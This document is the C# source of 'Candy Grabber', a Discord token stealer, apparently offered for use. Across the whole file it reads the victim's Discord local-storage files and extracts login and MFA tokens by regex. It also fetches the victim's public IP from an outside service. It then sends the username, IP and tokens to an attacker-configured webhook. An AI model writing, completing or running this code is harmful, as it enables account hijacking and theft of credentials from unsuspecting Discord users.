using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.Security.Principal;

namespace candy_grabber
{
    class Program
    {
        private static string webhook = ""; // Your webhook goes here
        private static bool foundSth = false;

        static void Main()
        {
            var msg = GetThem();
            if (foundSth)
            {
                SendMeResults(msg);
            }
        }

        public static List<string> GetThem()
        {
            List<string> discordtokens = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
            
            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string readedfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    discordtokens.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                    discordtokens.Add(match.Value + "\n");
            }


            discordtokens = discordtokens.ToList();

            Console.WriteLine(discordtokens);

            if (discordtokens.Count > 0)
            {
                foundSth = true;
            } else
            discordtokens.Add("Empty");

            return discordtokens;
        }

        public static string GetIP()
        {
            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }

        static void SendMeResults(List<string> message)
        {
            Http.Post(webhook, new NameValueCollection()
            {
                { "username", "Candy Grabber by goldblack" },
                { "avatar_url", "https://cdn.discordapp.com/attachments/696080024742395914/718483498947838063/beetlejuice-1.jpg" },
                { "content", "```\n" + "Report from Candy Grabber\n\n" + "Username: " + Environment.UserName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", message) + "\n\nLast one is correct" + "\n```" }
            });
        }
    }
    class Http
    {
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(uri, pairs);
        }
    }
}
